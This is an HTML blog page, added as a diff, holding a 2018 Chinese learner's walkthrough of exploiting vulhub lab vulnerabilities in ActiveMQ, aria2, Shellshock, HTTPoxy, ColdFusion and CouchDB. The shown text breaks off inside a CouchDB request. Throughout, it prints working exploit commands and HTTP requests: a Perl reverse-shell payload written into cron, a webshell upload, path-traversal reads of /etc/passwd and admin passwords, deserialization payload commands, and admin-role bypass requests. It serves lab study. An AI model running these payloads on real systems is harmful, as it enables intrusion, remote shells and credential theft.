@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>vulhub挖洞心得 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="最近想系统的学习一下攻防，就从挖洞开始把，听说vulhub里的漏洞很值得学习，就自己搭环境搞一搞 Docker的安装和使用 先推荐一个讲的比较详细的网站：https:&#x2F;&#x2F;blog.csdn.net&#x2F;zxcxq&#x2F;article&#x2F;details&#x2F;77261716">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulhub挖洞心得">
+<meta property="og:url" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="最近想系统的学习一下攻防，就从挖洞开始把，听说vulhub里的漏洞很值得学习，就自己搭环境搞一搞 Docker的安装和使用 先推荐一个讲的比较详细的网站：https:&#x2F;&#x2F;blog.csdn.net&#x2F;zxcxq&#x2F;article&#x2F;details&#x2F;77261716">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/7.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/8.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/9.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/10.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/11.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/12.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/13.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/14.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/15.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/16.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/17.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/18.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/19.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/20.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/21.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/22.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/23.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/24.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/25.png">
+<meta property="og:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/26.png">
+<meta property="article:published_time" content="2018-07-11T01:29:15.000Z">
+<meta property="article:modified_time" content="2019-12-30T10:31:51.363Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="攻防">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-vulhub挖洞心得" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/07/11/vulhub%E6%8C%96%E6%B4%9E%E5%BF%83%E5%BE%97/" class="article-date">
+  <time datetime="2018-07-11T01:29:15.000Z" itemprop="datePublished">2018-07-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      vulhub挖洞心得
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近想系统的学习一下攻防，就从挖洞开始把，听说vulhub里的漏洞很值得学习，就自己搭环境搞一搞</p>
+<h2 id="Docker的安装和使用"><a href="#Docker的安装和使用" class="headerlink" title="Docker的安装和使用"></a>Docker的安装和使用</h2><p> 先推荐一个讲的比较详细的网站：<a href="https://blog.csdn.net/zxcxq/article/details/77261716" target="_blank" rel="noopener">https://blog.csdn.net/zxcxq/article/details/77261716</a></p>
+<a id="more"></a>
+<h3 id="1-安装docker"><a href="#1-安装docker" class="headerlink" title="1.安装docker"></a>1.安装docker</h3><pre><code>apt-get update &amp;&amp; apt-get install docker.io
+</code></pre><h3 id="2-启动docker服务"><a href="#2-启动docker服务" class="headerlink" title="2.启动docker服务"></a>2.启动docker服务</h3><pre><code>service docker start
+</code></pre><h3 id="3-安装compose"><a href="#3-安装compose" class="headerlink" title="3.安装compose"></a>3.安装compose</h3><pre><code>pip install docker-compose
+</code></pre><p>安装好之后可以下载vulhub<br><a href="https://github.com/phith0n/vulhub" target="_blank" rel="noopener">https://github.com/phith0n/vulhub</a><br>还有一个vulapp<br><a href="https://github.com/Medicean/VulApps" target="_blank" rel="noopener">https://github.com/Medicean/VulApps</a></p>
+<h3 id="4-在线自动化编译docker环境"><a href="#4-在线自动化编译docker环境" class="headerlink" title="4.在线自动化编译docker环境"></a>4.在线自动化编译docker环境</h3><p> 进入vulhub目录，随便选择一个环境，这里以第一个activemq为例，进入该目录后，输入命令<code>docker-compose build</code><br> 如果报错有可能是服务没开，也有可能是作者已经编译好了，那就直接执行下一步</p>
+<h3 id="5-开启docker里的容器"><a href="#5-开启docker里的容器" class="headerlink" title="5.开启docker里的容器"></a>5.开启docker里的容器</h3><p> <code>docker-compose up -d</code><br>然后就可以看到环境已经搭建好了</p>
+<p>每个环境里面都有一个README.MD  里面有详细的说明漏洞环境如何搭建，如何启动，如何使用漏洞，所以一定要看一下这个文件</p>
+<h2 id="挖洞过程"><a href="#挖洞过程" class="headerlink" title="挖洞过程"></a>挖洞过程</h2><h3 id="1-activemq"><a href="#1-activemq" class="headerlink" title="1.activemq"></a>1.activemq</h3><h4 id="1-CVE-2015-5254"><a href="#1-CVE-2015-5254" class="headerlink" title="(1) CVE-2015-5254"></a>(1) CVE-2015-5254</h4><p>ActiveMQ 反序列化漏洞（CVE-2015-5254）</p>
+<p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
+<p>环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。</p>
+<p>漏洞利用过程如下：</p>
+<ol>
+<li>构造（可以使用ysoserial）可执行命令的序列化对象</li>
+<li>作为一个消息，发送给目标61616端口</li>
+<li>访问web管理页面，读取消息，触发漏洞</li>
+</ol>
+<p>使用<a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noopener">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p>
+<p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p>
+<p>执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure>
+<p><img src="vulhub挖洞心得/1.png" alt=""></p>
+<p>此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p>
+<p><img src="vulhub挖洞心得/2.png" alt=""></p>
+<p>点击查看这条消息即可触发命令执行，此时进入容器<code>docker-compose exec activemq bash</code>，可见/tmp/success已成功创建，说明漏洞利用成功：</p>
+<p><img src="vulhub挖洞心得/3.png" alt=""></p>
+<p>将命令替换成弹shell语句再利用：</p>
+<p><img src="vulhub挖洞心得/4.png" alt=""></p>
+<p>值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p>
+<h4 id="2-CVE-2016-3088"><a href="#2-CVE-2016-3088" class="headerlink" title="(2)CVE-2016-3088"></a>(2)CVE-2016-3088</h4><p>环境监听61616端口和8161端口，其中8161为web控制台端口，本漏洞就出现在web控制台中。<br>访问<code>http://192.168.6.130:8161/</code>看到web页面，说明环境已成功运行。</p>
+<p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>
+<p>写入crontab，自动化弹shell</p>
+<p>这是一个比较稳健的方法。首先上传cron配置文件（注意，换行一定要<code>\n</code>，不能是<code>\r\n</code>，否则crontab执行会失败）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.6.130:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;192.168.6.130&quot;;$p&#x3D;8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line">##</span><br></pre></td></tr></table></figure>
+<p>将其移动到<code>/etc/cron.d/root</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;etc&#x2F;cron.d&#x2F;root</span><br><span class="line">Host: 192.168.6.130:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+<p>如果上述两个请求都返回204了，说明写入成功。等待反弹shell：</p>
+<p>这个方法需要ActiveMQ是root运行，否则也不能写入cron文件。</p>
+<p>默认的ActiveMQ账号密码均为<code>admin</code>，首先访问<code>http://192.168.6.130:8161/admin/test/systemProperties.jsp</code>，查看ActiveMQ的绝对路径：</p>
+<p>然后上传webshell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line"></span><br><span class="line">webshell...</span><br></pre></td></tr></table></figure>
+<p>移动到web目录下的api文件夹（<code>/opt/activemq/webapps/api/s.jsp</code>）中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;2.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;s.jsp</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+<p>访问webshell（需要登录）,或者直接上菜刀</p>
+<h3 id="2-aria2"><a href="#2-aria2" class="headerlink" title="2.aria2"></a>2.aria2</h3><p>Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。</p>
+<p>因为rpc通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 <a href="http://binux.github.io/yaaw/demo/" target="_blank" rel="noopener">http://binux.github.io/yaaw/demo/</a> 。</p>
+<p>打开yaaw，点击配置按钮，填入运行aria2的目标域名：<code>http://your-ip:6800/jsonrpc</code>:<br><img src="vulhub挖洞心得/5.png" alt=""></p>
+<p>然后点击Add，增加一个新的下载任务。在Dir的位置填写下载至的目录，File Name处填写文件名。比如，我们通过写入一个crond任务来反弹shell：</p>
+<p><img src="vulhub挖洞心得/6.png" alt=""></p>
+<p>这时候，arai2会将恶意文件（我指定的URL）下载到/etc/cron.d/目录下，文件名为shell。而在debian中，/etc/cron.d目录下的所有文件将被作为计划任务配置文件（类似crontab）读取，等待一分钟不到即成功反弹shell：</p>
+<p><img src="vulhub挖洞心得/7.png" alt=""></p>
+<blockquote>
+<p>如果反弹不成功，注意crontab文件的格式，以及换行符必须是<code>\n</code>，且文件结尾需要有一个换行符。</p>
+</blockquote>
+<p>当然，我们也可以尝试写入其他文件</p>
+<h3 id="3-shellshock"><a href="#3-shellshock" class="headerlink" title="3.shellshock"></a>3.shellshock</h3><p>Shellshock 破壳漏洞（CVE-2014-6271）<br>访问<code>http://192.168.6.130/</code>，有两个文件：</p>
+<ul>
+<li>safe.cgi</li>
+<li>victim.cgi</li>
+</ul>
+<p>其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p>
+<p>带上payload访问victim.cgi，命令成功被执行：</p>
+<p><img src="vulhub挖洞心得/8.png" alt=""></p>
+<p>同样的数据包访问safe.cgi，不受影响：<br><img src="vulhub挖洞心得/9.png" alt=""></p>
+<h3 id="3-cgi"><a href="#3-cgi" class="headerlink" title="3.cgi"></a>3.cgi</h3><p>HTTPoxy漏洞（CVE-2016-5385）</p>
+<p>参考：<a href="原理">http://www.laruence.com/2016/07/19/3101.html</a></p>
+<p>简单来说，根据RFC 3875规定，cgi（fastcgi）要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p>
+<p>PHP5.6.24版本修复了该漏洞，不会再将<code>Proxy</code>放入环境变量中。本环境使用PHP 5.6.23为例。</p>
+<p>当然，该漏洞不止影响PHP，所有以CGI或Fastcgi运行的程序理论上都受到影响。</p>
+<p>正常请求<code>http://your-ip/index.php</code>，可见其Origin为当前请求的服务器，二者IP相等：</p>
+<p><img src="vulhub挖洞心得/10.png" alt=""></p>
+<p>在其他地方找到一个可以正常运行的http代理，如<code>http://x.x.122.65:8888/</code>。</p>
+<p>附带<code>Proxy: http://x.x.122.65:8888/</code>头，再次访问<code>http://your-ip/index.php</code>：</p>
+<p><img src="vulhub挖洞心得/11.png" alt=""></p>
+<p>如上图，可见此时的Origin已经变成<code>x.x.122.65</code>，也就是说真正进行HTTP访问的服务器是<code>x.x.122.65</code>，也就是说<code>x.x.122.65</code>已经将正常的HTTP请求代理了。</p>
+<p>在<code>x.x.122.65</code>上使用NC，就可以捕获当前请求的数据包，其中可能包含敏感数据：<br><img src="vulhub挖洞心得/12.png" alt=""></p>
+<h3 id="4-coldfusion"><a href="#4-coldfusion" class="headerlink" title="4.coldfusion"></a>4.coldfusion</h3><h4 id="1-Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）"><a href="#1-Adobe-ColdFusion-文件读取漏洞（CVE-2010-2861）" class="headerlink" title="(1)Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）"></a>(1)Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</h4><p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。</p>
+<p>直接访问<code>http://192.168.6.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code>，即可读取文件<code>/etc/passwd</code><br><img src="vulhub挖洞心得/13.png" alt=""><br>读取后台管理员密码<code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code>：<br><img src="vulhub挖洞心得/14.png" alt=""></p>
+<h4 id="Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）"><a href="#Adobe-ColdFusion-反序列化漏洞（CVE-2017-3066）" class="headerlink" title="Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）"></a>Adobe ColdFusion 反序列化漏洞（CVE-2017-3066）</h4><p>参考链接：</p>
+<ul>
+<li><a href="https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html" target="_blank" rel="noopener">https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html</a></li>
+</ul>
+<p>我们使用参考链接中的<a href="https://github.com/codewhitesec/ColdFusionPwn" target="_blank" rel="noopener">ColdFusionPwn</a>工具来生成POC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;touch &#x2F;tmp&#x2F;success&#39; poc.ser</span><br></pre></td></tr></table></figure>
+<p>POC生成于poc.ser文件中，将POC作为数据包body发送给<code>http://your-ip:8500/flex2gateway/amf</code>，Content-Type为application/x-amf：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;flex2gateway&#x2F;amf HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8500</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-amf</span><br><span class="line">Content-Length: 2853</span><br><span class="line"></span><br><span class="line">[...poc...]</span><br></pre></td></tr></table></figure>
+<p><img src="vulhub挖洞心得/15.png" alt=""></p>
+<p>进入容器中，发现<code>/tmp/success</code>已成功创建：</p>
+<p><img src="vulhub挖洞心得/16.png" alt=""></p>
+<p>将POC改成<br><a href="http://jackson.thuraisamy.me/runtime-exec-payloads.html" target="_blank" rel="noopener">反弹命令</a>，<br>成功拿到shell：<br><img src="vulhub挖洞心得/17.png" alt=""></p>
+<h3 id="5-couchdb"><a href="#5-couchdb" class="headerlink" title="5.couchdb"></a>5.couchdb</h3><h4 id="1-Couchdb-垂直权限绕过漏洞（CVE-2017-12635）"><a href="#1-Couchdb-垂直权限绕过漏洞（CVE-2017-12635）" class="headerlink" title="(1)Couchdb 垂直权限绕过漏洞（CVE-2017-12635）"></a>(1)Couchdb 垂直权限绕过漏洞（CVE-2017-12635）</h4><p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。<br>参考链接：</p>
+<ul>
+<li><a href="http://bobao.360.cn/learning/detail/4716.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4716.html</a></li>
+<li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" target="_blank" rel="noopener">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li>
+</ul>
+<p>首先，发送如下数据包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.6.130:5984</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 90</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可见，返回403错误：<code>{&quot;error&quot;:&quot;forbidden&quot;,&quot;reason&quot;:&quot;Only _admin may set roles&quot;}</code>，只有管理员才能设置Role角色：</p>
+<p><img src="vulhub挖洞心得/18.png" alt=""></p>
+<p>发送包含两个roles的数据包，即可绕过限制：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:5984</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  